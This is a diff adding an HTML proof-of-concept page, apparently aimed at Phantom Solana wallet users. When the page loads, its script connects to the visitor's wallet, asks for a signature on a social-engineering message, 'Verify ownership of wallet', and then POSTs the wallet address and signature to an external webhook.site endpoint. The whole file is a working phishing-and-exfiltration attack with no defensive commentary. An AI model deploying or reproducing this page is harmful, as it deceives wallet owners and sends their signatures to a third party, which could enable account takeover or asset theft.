@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Phantom Signature PoC</title>
+</head>
+<body>
+  <h2>Connecting Wallet...</h2>
+
+  <script>
+    (async () => {
+      // Step 1: Request wallet access
+      const provider = window.phantom?.solana;
+      if (!provider?.isPhantom) return alert('Phantom not found');
+
+      await provider.connect();
+
+      // Step 2: Message to be signed (social engineering context)
+      const message = "Verify ownership of wallet";
+      const encodedMessage = new TextEncoder().encode(message);
+
+      // Step 3: Trigger signMessage (may display Phantom UI)
+      const signed = await provider.signMessage(encodedMessage, "utf8");
+
+      // Step 4: Exfiltrate the signed message (bypassing preflight)
+      fetch("https://webhook.site/2246aa54-1e09-4a54-90dd-bd47fca4fd21", {
+        method: "POST",
+        headers: {
+          "Content-Type": "text/plain"
+        },
+        body: JSON.stringify({
+          wallet: provider.publicKey.toString(),
+          signature: Buffer.from(signed.signature).toString('hex'),
+          message: message
+        })
+      });
+    })();
+  </script>
+</body>
+</html>
